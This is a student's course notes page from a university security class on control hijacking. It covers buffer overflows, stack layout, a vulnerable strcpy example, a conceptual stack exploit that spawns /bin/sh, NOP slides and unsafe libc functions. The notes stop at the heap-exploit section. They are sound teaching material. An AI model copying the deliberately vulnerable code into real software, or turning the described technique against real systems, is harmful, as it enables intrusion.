<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Basic Control Hijacking Attacks # Attacker&rsquo;s goal: Take over target machine (e.g., web server) Execute arbitrary code on target by hijacking application control flow Examples: Buffer overflow and integer overflow attacks Format string vulnerabilities Use after free Buffer overflow attacks # Extremely common in C/C++ programs Now advised to avoid C/C++ Use Rust: typesystem should help avoid these bugs First major exploit: 1988 internet worm, bug in fingerd What is needed:"><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content><meta property="og:description" content="Basic Control Hijacking Attacks # Attacker&rsquo;s goal: Take over target machine (e.g., web server) Execute arbitrary code on target by hijacking application control flow Examples: Buffer overflow and integer overflow attacks Format string vulnerabilities Use after free Buffer overflow attacks # Extremely common in C/C++ programs Now advised to avoid C/C++ Use Rust: typesystem should help avoid these bugs First major exploit: 1988 internet worm, bug in fingerd What is needed:"><meta property="og:type" content="article"><meta property="og:url" content="https://saligrama.io/notes/cs155/2022-03-30-control-hijacking/"><meta property="article:section" content="cs155"><title>Control Hijacking | Aditya's notes</title><link rel=manifest href=/notes/manifest.json><link rel=icon href=/notes/favicon.png type=image/x-icon><link rel=stylesheet href=/notes/book.min.395a67680f48b8d23bbf267f26d0d1259e69554b2b704e371e8e15cbe656e05f.css integrity="sha256-OVpnaA9IuNI7vyZ/JtDRJZ5pVUsrcE43Ho4Vy+ZW4F8=" crossorigin=anonymous><script defer src=/notes/flexsearch.min.js></script>
<script defer src=/notes/en.search.min.28b6a1e44dcced8354dba5fd87a924c2bb511fa5af481078980603e4a53417f0.js integrity="sha256-KLah5E3M7YNU26X9h6kkwrtRH6WvSBB4mAYD5KU0F/A=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/notes/><span>Aditya's notes</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><input type=checkbox id=section-a88f46c31d1ebdf165810583424fda37 class=toggle>
<label for=section-a88f46c31d1ebdf165810583424fda37 class="flex justify-between"><a role=button>CS 103, Fall 2020</a></label><ul><li><a href=/notes/cs103/2020-09-16-set-theory/>Set Theory</a></li><li><a href=/notes/cs103/2020-09-18-indirect-proofs/>Indirect Proofs</a></li><li><a href=/notes/cs103/2020-09-18-mathematical-proofs/>Mathematical Proofs</a></li><li><a href=/notes/cs103/2020-09-26-first-order-logic/>First Order Logic</a></li><li><a href=/notes/cs103/2020-09-26-propositional-logic/>Propositional Logic</a></li><li><a href=/notes/cs103/2020-09-27-first-order-logic-continued/>First Order Logic Continued</a></li><li><a href=/notes/cs103/2020-09-30-binary-relations/>Binary Relations</a></li><li><a href=/notes/cs103/2020-10-01-binary-relations-continued/>Binary Relations Continued</a></li><li><a href=/notes/cs103/2020-10-04-functions/>Functions</a></li><li><a href=/notes/cs103/2020-10-10-cardinality/>Cardinality</a></li><li><a href=/notes/cs103/2020-10-11-graph-theory/>Graph Theory</a></li><li><a href=/notes/cs103/2020-10-17-pigeonhole-principle/>Pigeonhole Principle</a></li><li><a href=/notes/cs103/2020-10-18-induction/>Induction</a></li><li><a href=/notes/cs103/2020-10-19-induction-variants/>Induction Variants</a></li><li><a href=/notes/cs103/2020-10-20-computability-and-formal-languages/>Computability and Formal Languages</a></li><li><a href=/notes/cs103/2020-10-25-nondeterministic-finite-automata/>Nondeterministic Finite Automata</a></li><li><a href=/notes/cs103/2020-10-26-nfa-dfa-equivalence/>Nfa Dfa Equivalence</a></li><li><a href=/notes/cs103/2020-10-26-regular-expressions/>Regular Expressions</a></li><li><a href=/notes/cs103/2020-11-01-nonregular-languages/>Nonregular Languages</a></li><li><a href=/notes/cs103/2020-11-02-context-free-grammars/>Context Free Grammars</a></li><li><a href=/notes/cs103/2020-11-03-turing-machines/>Turing Machines</a></li><li><a href=/notes/cs103/2020-11-08-turing-machine-subroutines/>Turing Machine Subroutines</a></li><li><a href=/notes/cs103/2020-11-08-universal-turing-machine/>Universal Turing Machine</a></li><li><a href=/notes/cs103/2020-11-08-unsolvable-problems/>Unsolvable Problems</a></li><li><a href=/notes/cs103/2020-11-14-unsolvable-problems-continued/>Unsolvable Problems Continued</a></li></ul></li><li><input type=checkbox id=section-cf13475a7a80a5dd57b5a55dce73d171 class=toggle>
<label for=section-cf13475a7a80a5dd57b5a55dce73d171 class="flex justify-between"><a role=button>CS 107, Fall 2020</a></label><ul><li><a href=/notes/cs107/2020-09-18-integer-representations/>Integer Representations</a></li><li><a href=/notes/cs107/2020-09-21-bitwise-operations/>Bitwise Operations</a></li><li><a href=/notes/cs107/2020-09-25-c-chars-and-strings/>C Chars and Strings</a></li><li><a href=/notes/cs107/2020-09-28-more-c-strings/>More C Strings</a></li><li><a href=/notes/cs107/2020-10-02-pointers-arrays/>Pointers Arrays</a></li><li><a href=/notes/cs107/2020-10-05-stack-and-heap/>Stack and Heap</a></li><li><a href=/notes/cs107/2020-10-09-c-generics/>C Generics</a></li><li><a href=/notes/cs107/2020-10-12-function-pointers/>Function Pointers</a></li><li><a href=/notes/cs107/2020-10-16-assembly/>Assembly</a></li><li><a href=/notes/cs107/2020-10-19-assembly-arithmetic-logic/>Assembly Arithmetic Logic</a></li><li><a href=/notes/cs107/2020-10-23-assembly-control-flow/>Assembly Control Flow</a></li><li><a href=/notes/cs107/2020-10-26-assembly-function-calls-and-return-stack/>Assembly Function Calls and Return Stack</a></li><li><a href=/notes/cs107/2020-10-30-heap-management/>Heap Management</a></li><li><a href=/notes/cs107/2020-11-09-program-optimization/>Program Optimization</a></li></ul></li><li><input type=checkbox id=section-4e3bc6e2f7a0feae33c3e43356d49c80 class=toggle>
<label for=section-4e3bc6e2f7a0feae33c3e43356d49c80 class="flex justify-between"><a role=button>CS 110L, Spring 2021</a></label><ul><li><a href=/notes/cs110l/2021-03-30-course-overview/>Course Overview</a></li><li><a href=/notes/cs110l/2021-04-01-fixing-c/>Fixing C</a></li><li><a href=/notes/cs110l/2021-04-06-intro-to-rust/>Intro to Rust</a></li><li><a href=/notes/cs110l/2021-04-08-ownership/>Ownership</a></li><li><a href=/notes/cs110l/2021-04-13-error-handling/>Error Handling</a></li><li><a href=/notes/cs110l/2021-04-22-traits/>Traits</a></li><li><a href=/notes/cs110l/2021-04-27-generics/>Generics</a></li><li><a href=/notes/cs110l/2021-04-29-multiprocessing/>Multiprocessing</a></li></ul></li><li><input type=checkbox id=section-23e7773af736437c02202412a988f2db class=toggle>
<label for=section-23e7773af736437c02202412a988f2db class="flex justify-between"><a role=button>CS 111, Spring 2021</a></label><ul><li><a href=/notes/cs111/2021-03-31-threads-and-dispatching/>Threads and Dispatching</a></li><li><a href=/notes/cs111/2021-04-02-concurrency/>Concurrency</a></li><li><a href=/notes/cs111/2021-04-05-synchronization/>Synchronization</a></li><li><a href=/notes/cs111/2021-04-07-shared-memory-and-condition-variables-and-locks/>Shared Memory and Condition Variables and Locks</a></li><li><a href=/notes/cs111/2021-04-09-lock-implementation-and-deadlocking/>Lock Implementation and Deadlocking</a></li><li><a href=/notes/cs111/2021-04-12-scheduling/>Scheduling</a></li><li><a href=/notes/cs111/2021-04-14-multiprocessing/>Multiprocessing</a></li><li><a href=/notes/cs111/2021-04-16-linking/>Linking</a></li><li><a href=/notes/cs111/2021-04-19-storage-management/>Storage Management</a></li><li><a href=/notes/cs111/2021-04-21-virtual-memory/>Virtual Memory</a></li><li><a href=/notes/cs111/2021-04-23-dynamic-address-translation/>Dynamic Address Translation</a></li><li><a href=/notes/cs111/2021-04-26-segmentation-and-paging/>Segmentation and Paging</a></li><li><a href=/notes/cs111/2021-04-30-demand-paging/>Demand Paging</a></li><li><a href=/notes/cs111/2021-05-05-disks/>Disks</a></li><li><a href=/notes/cs111/2021-05-07-file-systems/>File Systems</a></li><li><a href=/notes/cs111/2021-05-10-realworld-filesystem-structures/>Realworld Filesystem Structures</a></li><li><a href=/notes/cs111/2021-05-12-directories/>Directories</a></li><li><a href=/notes/cs111/2021-05-14-crash-recovery/>Crash Recovery</a></li><li><a href=/notes/cs111/2021-05-19-protection/>Protection</a></li><li><a href=/notes/cs111/2021-05-24-flash-memory/>Flash Memory</a></li><li><a href=/notes/cs111/2021-05-28-virtual-machines/>Virtual Machines</a></li></ul></li><li><input type=checkbox id=section-a586b190ebf0a4874cd21a1d76743261 class=toggle>
<label for=section-a586b190ebf0a4874cd21a1d76743261 class="flex justify-between"><a role=button>CS 143, Spring 2022</a></label><ul><li><a href=/notes/cs143/2022-03-29-intro/>Intro</a></li><li><a href=/notes/cs143/2022-03-31-language-design-and-cool/>Language Design and Cool</a></li><li><a href=/notes/cs143/2022-04-05-lexical-analysis/>Lexical Analysis</a></li><li><a href=/notes/cs143/2022-04-07-lexical-analysis-implementation/>Lexical Analysis Implementation</a></li><li><a href=/notes/cs143/2022-04-12-parsing/>Parsing</a></li><li><a href=/notes/cs143/2022-04-14-syntax-directed-translation/>Syntax Directed Translation</a></li><li><a href=/notes/cs143/2022-04-19-top-down-parsing/>Top Down Parsing</a></li><li><a href=/notes/cs143/2022-04-26-semantic-analysis/>Semantic Analysis</a></li></ul></li><li><input type=checkbox id=section-37836de7a703e433b2642097d511f482 class=toggle>
<label for=section-37836de7a703e433b2642097d511f482 class="flex justify-between"><a role=button>CS 149, Fall 2022</a></label><ul><li><a href=/notes/cs149/2022-09-27-intro/>Intro</a></li><li><a href=/notes/cs149/2022-09-29-modern-multicore-processors/>Modern Multicore Processors</a></li><li><a href=/notes/cs149/2022-10-04-parallel-abstractions/>Parallel Abstractions</a></li><li><a href=/notes/cs149/2022-10-06-parallel-models/>Parallel Models</a></li><li><a href=/notes/cs149/2022-10-11-work-distribution-and-scheduling/>Work Distribution and Scheduling</a></li><li><a href=/notes/cs149/2022-10-13-locality-communication-and-contention/>Locality Communication and Contention</a></li><li><a href=/notes/cs149/2022-10-18-gpu-architecture-and-cuda/>Gpu Architecture and Cuda</a></li><li><a href=/notes/cs149/2022-10-20-data-parallel-architecture/>Data Parallel Architecture</a></li><li><a href=/notes/cs149/2022-10-25-spark/>Spark</a></li><li><a href=/notes/cs149/2022-10-27-cache-coherence/>Cache Coherence</a></li><li><a href=/notes/cs149/2022-11-01-memory-consistency/>Memory Consistency</a></li><li><a href=/notes/cs149/2022-11-03-lock-implementation-and-lock-free-programming/>Lock Implementation and Lock Free Programming</a></li><li><a href=/notes/cs149/2022-11-10-transactional-memory/>Transactional Memory</a></li><li><a href=/notes/cs149/2022-11-29-heterogeneous-processing-and-domain-specific-languages/>Heterogeneous Processing and Domain Specific Languages</a></li><li><a href=/notes/cs149/2022-12-06-asics-and-fpgas/>Asics and Fpgas</a></li></ul></li><li><input type=checkbox id=section-4f9fa520660f975442d4640415905b3c class=toggle>
<label for=section-4f9fa520660f975442d4640415905b3c class="flex justify-between"><a role=button>CS 154, Fall 2021</a></label><ul><li><a href=/notes/cs154/2021-09-28-finite-automata/>Finite Automata</a></li><li><a href=/notes/cs154/2021-10-05-pumping-lemma-and-myhill-nerode/>Pumping Lemma and Myhill Nerode</a></li><li><a href=/notes/cs154/2021-10-12-streaming-algorithms-and-turing-machines/>Streaming Algorithms and Turing Machines</a></li></ul></li><li><input type=checkbox id=section-d24cd7d7d21fe73135d596a09b50887f class=toggle checked>
<label for=section-d24cd7d7d21fe73135d596a09b50887f class="flex justify-between"><a role=button>CS 155, Spring 2022</a></label><ul><li><a href=/notes/cs155/2022-03-28-intro/>Intro</a></li><li><a href=/notes/cs155/2022-03-30-control-hijacking/ class=active>Control Hijacking</a></li><li><a href=/notes/cs155/2022-04-04-control-hijacking-defenses/>Control Hijacking Defenses</a></li><li><a href=/notes/cs155/2022-04-06-security-principles/>Security Principles</a></li><li><a href=/notes/cs155/2022-04-11-isolation-and-sandboxing/>Isolation and Sandboxing</a></li><li><a href=/notes/cs155/2022-04-13-vuln-finding/>Vuln Finding</a></li><li><a href=/notes/cs155/2022-04-18-web-security/>Web Security</a></li><li><a href=/notes/cs155/2022-04-20-web-attacks/>Web Attacks</a></li><li><a href=/notes/cs155/2022-04-25-web-defenses/>Web Defenses</a></li><li><a href=/notes/cs155/2022-05-04-processor-security/>Processor Security</a></li><li><a href=/notes/cs155/2022-05-09-internet-protocol-security/>Internet Protocol Security</a></li></ul></li><li><input type=checkbox id=section-471622039e8d87cd8d642483c8d218b8 class=toggle>
<label for=section-471622039e8d87cd8d642483c8d218b8 class="flex justify-between"><a role=button>CS 161, Winter 2022</a></label><ul><li><a href=/notes/cs161/2022-01-03-intro/>Intro</a></li><li><a href=/notes/cs161/2022-01-05-worst-case-and-asymptotic-analysis/>Worst Case and Asymptotic Analysis</a></li><li><a href=/notes/cs161/2022-01-10-recurrence-relations/>Recurrence Relations</a></li><li><a href=/notes/cs161/2022-01-12-median-and-selection/>Median and Selection</a></li><li><a href=/notes/cs161/2022-01-19-randomized-algorithms-and-quicksort/>Randomized Algorithms and Quicksort</a></li><li><a href=/notes/cs161/2022-01-24-sorting-lower-bounds/>Sorting Lower Bounds</a></li><li><a href=/notes/cs161/2022-01-26-binary-search-trees/>Binary Search Trees</a></li><li><a href=/notes/cs161/2022-01-31-hashing/>Hashing</a></li><li><a href=/notes/cs161/2022-02-02-graphs-and-graph-search/>Graphs and Graph Search</a></li><li><a href=/notes/cs161/2022-02-07-strongly-connected-components/>Strongly Connected Components</a></li><li><a href=/notes/cs161/2022-02-09-weighted-graphs-and-dijkstra/>Weighted Graphs and Dijkstra</a></li><li><a href=/notes/cs161/2022-02-14-dynamic-programming/>Dynamic Programming</a></li><li><a href=/notes/cs161/2022-02-16-dynamic-programming-applications/>Dynamic Programming Applications</a></li><li><a href=/notes/cs161/2022-02-23-greedy-algorithms/>Greedy Algorithms</a></li><li><a href=/notes/cs161/2022-02-28-minimum-spanning-trees/>Minimum Spanning Trees</a></li></ul></li><li><input type=checkbox id=section-0794dc87987599843ba69a8ea82e9b6a class=toggle>
<label for=section-0794dc87987599843ba69a8ea82e9b6a class="flex justify-between"><a role=button>CS 224U, Spring 2021</a></label><ul><li><a href=/notes/cs224u/2021-03-29-course-overview/>Course Overview</a></li><li><a href=/notes/cs224u/2021-03-31-vector-space-models/>Vector Space Models</a></li><li><a href=/notes/cs224u/2021-04-12-sentiment-analysis/>Sentiment Analysis</a></li></ul></li><li><input type=checkbox id=section-efae8264f5fe410feb1b40be6f99baea class=toggle>
<label for=section-efae8264f5fe410feb1b40be6f99baea class="flex justify-between"><a role=button>CS 229, Fall 2021</a></label><ul><li><a href=/notes/cs229/2021-09-21-intro/>Intro</a></li><li><a href=/notes/cs229/2021-09-23-supervised-learning-setup/>Supervised Learning Setup</a></li><li><a href=/notes/cs229/2021-09-28-logistic-regression/>Logistic Regression</a></li><li><a href=/notes/cs229/2021-09-30-generalized-linear-models/>Generalized Linear Models</a></li><li><a href=/notes/cs229/2021-10-05-generative-learning-algorithms/>Generative Learning Algorithms</a></li><li><a href=/notes/cs229/2021-10-07-naive-bayes/>Naive Bayes</a></li><li><a href=/notes/cs229/2021-10-12-kernel-methods-and-svm/>Kernel Methods and Svm</a></li><li><a href=/notes/cs229/2021-10-14-deep-learning/>Deep Learning</a></li><li><a href=/notes/cs229/2021-10-19-deep-learning-optimization/>Deep Learning Optimization</a></li><li><a href=/notes/cs229/2021-10-21-model-selection/>Model Selection</a></li></ul></li><li><input type=checkbox id=section-58493bdbfe80396f07f44c40ecf068c8 class=toggle>
<label for=section-58493bdbfe80396f07f44c40ecf068c8 class="flex justify-between"><a role=button>CS 249I, Winter 2023</a></label><ul><li><a href=/notes/cs249i/2023-01-09-internet-players/>Internet Players</a></li><li><a href=/notes/cs249i/2023-01-18-modern-routing-practices/>Modern Routing Practices</a></li><li><a href=/notes/cs249i/2023-01-23-last-mile-access/>Last Mile Access</a></li><li><a href=/notes/cs249i/2023-01-25-host-and-network-addressing/>Host and Network Addressing</a></li><li><a href=/notes/cs249i/2023-01-30-domain-name-system/>Domain Name System</a></li><li><a href=/notes/cs249i/2023-02-06-internet-governance/>Internet Governance</a></li><li><a href=/notes/cs249i/2023-02-08-modern-web-protocols/>Modern Web Protocols</a></li><li><a href=/notes/cs249i/2023-02-13-tls-and-webpki/>Tls and Webpki</a></li><li><a href=/notes/cs249i/2023-02-13-web-content/>Web Content</a></li><li><a href=/notes/cs249i/2023-02-22-internet-crime/>Internet Crime</a></li></ul></li><li><input type=checkbox id=section-292ea4e126876f1048e61c4dc744546c class=toggle>
<label for=section-292ea4e126876f1048e61c4dc744546c class="flex justify-between"><a role=button>CS 251, Fall 2022</a></label><ul><li><a href=/notes/cs251/2022-09-26-intro/>Intro</a></li><li><a href=/notes/cs251/2022-09-28-bitcoin-mechanics/>Bitcoin Mechanics</a></li><li><a href=/notes/cs251/2022-10-03-bitcoin-scripts-and-wallets/>Bitcoin Scripts and Wallets</a></li><li><a href=/notes/cs251/2022-10-05-consensus/>Consensus</a></li><li><a href=/notes/cs251/2022-10-10-internet-consensus/>Internet Consensus</a></li><li><a href=/notes/cs251/2022-10-17-ethereum/>Ethereum</a></li><li><a href=/notes/cs251/2022-10-19-solidity/>Solidity</a></li><li><a href=/notes/cs251/2022-11-02-legal-aspects-and-regulation/>Legal Aspects and Regulation</a></li><li><a href=/notes/cs251/2022-11-07-privacy-and-deanonymization-and-mixing/>Privacy and Deanonymization and Mixing</a></li><li><a href=/notes/cs251/2022-11-09-privacy-via-zk-snarks/>Privacy via Zk Snarks</a></li></ul></li><li><input type=checkbox id=section-98d861db134658b3e020a9d74c50ad24 class=toggle>
<label for=section-98d861db134658b3e020a9d74c50ad24 class="flex justify-between"><a role=button>CS 255, Winter 2022</a></label><ul><li><a href=/notes/cs255/2022-01-03-intro/>Intro</a></li><li><a href=/notes/cs255/2022-01-05-stream-ciphers/>Stream Ciphers</a></li><li><a href=/notes/cs255/2022-01-10-block-ciphers/>Block Ciphers</a></li><li><a href=/notes/cs255/2022-01-12-pseudorandom-functions/>Pseudorandom Functions</a></li><li><a href=/notes/cs255/2022-01-19-data-integrity-and-macs/>Data Integrity and Macs</a></li><li><a href=/notes/cs255/2022-01-24-collision-resistance/>Collision Resistance</a></li><li><a href=/notes/cs255/2022-01-26-authenticated-encryption/>Authenticated Encryption</a></li><li><a href=/notes/cs255/2022-01-31-key-management/>Key Management</a></li><li><a href=/notes/cs255/2022-02-02-key-exchange-math/>Key Exchange Math</a></li><li><a href=/notes/cs255/2022-02-07-public-key-encryption/>Public Key Encryption</a></li><li><a href=/notes/cs255/2022-02-09-pke-schemes/>Pke Schemes</a></li><li><a href=/notes/cs255/2022-02-14-digital-signatures/>Digital Signatures</a></li><li><a href=/notes/cs255/2022-02-16-certificates/>Certificates</a></li><li><a href=/notes/cs255/2022-02-23-id-protocols/>Id Protocols</a></li><li><a href=/notes/cs255/2022-02-28-key-exchange-protocols/>Key Exchange Protocols</a></li><li><a href=/notes/cs255/2022-03-02-zero-knowledge-protocols/>Zero Knowledge Protocols</a></li><li><a href=/notes/cs255/2022-03-07-quantum-cryptography/>Quantum Cryptography</a></li></ul></li><li><input type=checkbox id=section-3c4550884ed49f470e55fabac7077d16 class=toggle>
<label for=section-3c4550884ed49f470e55fabac7077d16 class="flex justify-between"><a role=button>Cs153</a></label><ul><li><a href=/notes/cs153/2023-01-12-intro/>Intro</a></li></ul></li><li><input type=checkbox id=section-568ed1bc8289796d56a6d06a22d7eb40 class=toggle>
<label for=section-568ed1bc8289796d56a6d06a22d7eb40 class="flex justify-between"><a role=button>INTLPOL 268, Fall 2021</a></label><ul><li><a href=/notes/intlpol268/2021-09-20-intro/>Intro</a></li><li><a href=/notes/intlpol268/2021-09-22-legal-intro-and-electronic-communications-privacy-act/>Legal Intro and Electronic Communications Privacy Act</a></li><li><a href=/notes/intlpol268/2021-09-27-web-requests-and-attacks/>Web Requests and Attacks</a></li><li><a href=/notes/intlpol268/2021-09-29-ecpa-for-private-actors/>Ecpa for Private Actors</a></li><li><a href=/notes/intlpol268/2021-10-04-cyberattacks/>Cyberattacks</a></li><li><a href=/notes/intlpol268/2021-10-06-computer-fraud-and-abuse-act/>Computer Fraud and Abuse Act</a></li><li><a href=/notes/intlpol268/2021-10-11-network-security/>Network Security</a></li><li><a href=/notes/intlpol268/2021-10-13-cfaa-dmca-and-security-research/>Cfaa Dmca and Security Research</a></li><li><a href=/notes/intlpol268/2021-10-20-data-security-laws/>Data Security Laws</a></li><li><a href=/notes/intlpol268/2021-10-25-corporate-intrusion/>Corporate Intrusion</a></li><li><a href=/notes/intlpol268/2021-10-27-ransomware-and-foreign-hackers/>Ransomware and Foreign Hackers</a></li><li><a href=/notes/intlpol268/2021-11-01-cryptography/>Cryptography</a></li><li><a href=/notes/intlpol268/2021-11-03-cyber-conflict/>Cyber Conflict</a></li><li><a href=/notes/intlpol268/2021-11-08-dark-web-and-cryptocurrencies/>Dark Web and Cryptocurrencies</a></li><li><a href=/notes/intlpol268/2021-11-10-encryption-and-technical-assistance/>Encryption and Technical Assistance</a></li><li><a href=/notes/intlpol268/2021-11-15-malware/>Malware</a></li><li><a href=/notes/intlpol268/2021-11-17-government-hacking/>Government Hacking</a></li><li><a href=/notes/intlpol268/2021-11-29-new-frontiers/>New Frontiers</a></li></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/notes/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Control Hijacking</strong>
<label for=toc-control><img src=/notes/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#basic-control-hijacking-attacks>Basic Control Hijacking Attacks</a><ul><li><a href=#buffer-overflow-attacks>Buffer overflow attacks</a><ul><li><a href=#linux-process-memory-layout-x86-64>Linux process memory layout (x86-64)</a></li><li><a href=#linux-stack-frame-x86-64>Linux stack frame (x86-64)</a></li><li><a href=#review-of-buffer-overflows>Review of buffer overflows</a></li><li><a href=#basic-stack-exploit>Basic stack exploit</a><ul><li><a href=#the-nop-slide>The NOP slide</a></li><li><a href=#details-and-examples>Details and examples</a></li></ul></li><li><a href=#many-unsafe-libc-functions>Many unsafe libc functions</a></li><li><a href=#buffer-overflow-exploit-opportunities>Buffer overflow exploit opportunities</a></li><li><a href=#heap-exploits-corrupting-virtual-tables>Heap exploits: corrupting virtual tables</a><ul><li><a href=#example-exploiting-browser-heap>Example: exploiting browser heap</a></li></ul></li><li><a href=#ad-hoc-heap-overflow-mitigations>Ad-hoc heap overflow mitigations</a></li><li><a href=#finding-overflows-by-fuzzing>Finding overflows by fuzzing</a></li></ul></li><li><a href=#more-control-hijacking-exploits>More control hijacking exploits</a><ul><li><a href=#integer-overflows>Integer overflows</a></li><li><a href=#format-string-bugs>Format string bugs</a></li><li><a href=#use-after-free-exploits>Use-after-free exploits</a></li></ul></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=basic-control-hijacking-attacks>Basic Control Hijacking Attacks
<a class=anchor href=#basic-control-hijacking-attacks>#</a></h1><ul><li>Attacker&rsquo;s goal:<ul><li>Take over target machine (e.g., web server)</li><li>Execute arbitrary code on target by hijacking application control flow</li></ul></li><li>Examples:<ul><li>Buffer overflow and integer overflow attacks</li><li>Format string vulnerabilities</li><li>Use after free</li></ul></li></ul><h2 id=buffer-overflow-attacks>Buffer overflow attacks
<a class=anchor href=#buffer-overflow-attacks>#</a></h2><ul><li>Extremely common in C/C++ programs<ul><li>Now advised to avoid C/C++</li><li>Use Rust: typesystem should help avoid these bugs</li></ul></li><li>First major exploit: 1988 internet worm, bug in <code>fingerd</code></li></ul><p>What is needed:</p><ul><li>Attacker needs to know which CPU and OS used on the target machine<ul><li>Examples are x86-64 running Linux or Windows (project is 32-bit)</li><li>Details vary slightly between CPUs and OSs<ul><li>Stack frame structure (Unix vs. Windows, x86 vs. ARM)</li><li>Endianness</li></ul></li></ul></li></ul><h3 id=linux-process-memory-layout-x86-64>Linux process memory layout (x86-64)
<a class=anchor href=#linux-process-memory-layout-x86-64>#</a></h3><p><img src=/notes/images/cs155/2022-03-30-linux-process-memory-layout.png alt="Linux process memory layout"></p><h3 id=linux-stack-frame-x86-64>Linux stack frame (x86-64)
<a class=anchor href=#linux-stack-frame-x86-64>#</a></h3><p><img src=/notes/images/cs155/2022-03-30-linux-stack-frame.png alt="Linux stack frame"></p><h3 id=review-of-buffer-overflows>Review of buffer overflows
<a class=anchor href=#review-of-buffer-overflows>#</a></h3><p>Suppose a web server contains the following function:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>func</span>(<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>str) {
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>char</span> buf[<span style=color:#bd93f9>128</span>];
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>strcpy</span>(buf, str);
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>do_something</span>(buf);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>After <code>strcpy</code>, stack looks like:</p><p><img src=/notes/images/cs155/2022-03-30-strcpy-ok.png alt="Buffer ok"></p><p>If <code>*str</code> is 144 bytes long, after <code>strcpy</code>, stack looks like:</p><p><img src=/notes/images/cs155/2022-03-30-strcpy-bad.png alt="Buffer bad"></p><h3 id=basic-stack-exploit>Basic stack exploit
<a class=anchor href=#basic-stack-exploit>#</a></h3><p>Suppose <code>*str</code> is such that after <code>strcpy</code> looks like</p><p><img src=/notes/images/cs155/2022-03-30-basic-stack-exploit.png alt="Stack exploit"></p><p>where Program P is <code>exec("/bin/sh")</code>. This allows an attacker to run a shell on the webserver.</p><p>Note: attack code P runs <em>in stack</em>.</p><h4 id=the-nop-slide>The NOP slide
<a class=anchor href=#the-nop-slide>#</a></h4><p>Problem: how does attacker determine return address?</p><p>Solution: NOP slide</p><ul><li>Guess <em>approximate</em> state when <code>func()</code> is called</li><li>Insert many NOPs before program P</li></ul><pre tabindex=0><code class=language-assembly data-lang=assembly>nop
xor eax, eax
inc ax
</code></pre><p><img src=/notes/images/cs155/2022-03-30-nop-slide.png alt="NOP slide"></p><h4 id=details-and-examples>Details and examples
<a class=anchor href=#details-and-examples>#</a></h4><p>Complications:</p><ul><li>Program P should not contain the <code>\0</code> character</li><li>Overflow should not crash program before <code>func()</code> exits</li></ul><p>Famous remote stack smashing overflows:</p><ul><li>Overflow in Windows animated curosrs (ANI) - <code>LoadAniIcon()</code></li><li>Buffer overflow in Symantec virus detection (May 2016)<ul><li>Overflow when parsing PE headers - kernel vuln</li></ul></li></ul><h3 id=many-unsafe-libc-functions>Many unsafe libc functions
<a class=anchor href=#many-unsafe-libc-functions>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#50fa7b>strcpy</span>(<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>dest, <span style=color:#ff79c6>const</span> <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>src);
</span></span><span style=display:flex><span><span style=color:#50fa7b>strcat</span>(<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>dest, <span style=color:#ff79c6>const</span> <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>src);
</span></span><span style=display:flex><span><span style=color:#50fa7b>gets</span>(<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>s);
</span></span><span style=display:flex><span><span style=color:#50fa7b>scanf</span>(<span style=color:#ff79c6>const</span> <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>format, ...);
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>&ldquo;Safe&rdquo; <code>libc</code> versions <code>strncpy</code>, <code>strncat</code> are misleading (e.g. <code>strncpy</code> may leave string unterminated)</p><p>Windows C runtime (CRT) ensures proper termination:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#50fa7b>strcpy_s</span>(<span style=color:#ff79c6>*</span>dest, DestSize, <span style=color:#ff79c6>*</span>src);
</span></span></code></pre></div><h3 id=buffer-overflow-exploit-opportunities>Buffer overflow exploit opportunities
<a class=anchor href=#buffer-overflow-exploit-opportunities>#</a></h3><ul><li>Exception handlers<ul><li>Overwrite address of an exception handler in stack frame</li><li>Forces attacker&rsquo;s code to run instead of exception code when an exception executes</li></ul></li><li>Function pointers (e.g. PHP 4.0.2, MS MediaPlayer bitmaps)<ul><li>Overflow buffer, attacker&rsquo;s code replaces address to function pointer and override it</li></ul></li><li>Longjmp buffers (<code>longjmp(pos)</code>, e.g. Perl 5.003)<ul><li>Overflowing buffer next to <code>pos</code> overrides value of <code>pos</code></li></ul></li></ul><h3 id=heap-exploits-corrupting-virtual-tables>Heap exploits: corrupting virtual tables
